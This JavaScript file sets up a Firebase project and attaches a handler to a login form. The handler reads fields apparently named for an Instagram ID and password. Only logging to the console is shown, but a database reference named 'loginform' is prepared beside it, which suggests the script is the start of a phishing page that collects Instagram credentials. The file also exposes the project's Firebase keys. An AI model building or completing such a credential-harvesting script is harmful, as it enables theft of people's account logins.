const firebaseConfig = {
    apiKey: "AIzaSyCwwLm0D1fCWchXpuNigdPzkmK-awiRqWo",
    authDomain: "nuguna1-e84f8.firebaseapp.com",
    databaseURL: "https://nuguna1-e84f8-default-rtdb.firebaseio.com",
    projectId: "nuguna1-e84f8",
    storageBucket: "nuguna1-e84f8.appspot.com",
    messagingSenderId: "827689316231",
    appId: "1:827689316231:web:48a5c69d816345741aed22",
    measurementId: "G-0SDD2DDTGR"
};


// inirialize firebase
firebase.initializeApp(firebaseConfig);

// reference your databas
var loginformDB = firebase.database().ref('loginform');

document.getElementById('loginform').addEventListener('submit',submitForm);

function submitForm(e){
    e.preventDefault();
    var email = getElementVal('instaID');
    var password = getElementVal('instaPW');

    console.log(email,password);
}


const getElementVal = (id) => {
    return document.getElementById(id).value;
};